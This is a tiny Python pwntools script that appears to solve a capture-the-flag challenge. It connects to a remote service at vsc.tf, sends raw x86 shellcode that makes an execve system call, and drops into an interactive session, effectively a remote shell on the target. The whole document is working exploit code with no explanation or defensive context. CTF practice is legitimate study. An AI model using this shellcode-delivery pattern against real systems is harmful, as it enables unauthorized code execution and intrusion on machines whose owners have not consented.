from pwn import *
shellcode = b"\xB0\x0B\xBB\x20\x00\x01\x00\x31\xC9\x31\xD2\xCD\x80"
r = remote('vsc.tf', 3026)
r.sendline(shellcode)
r.interactive()
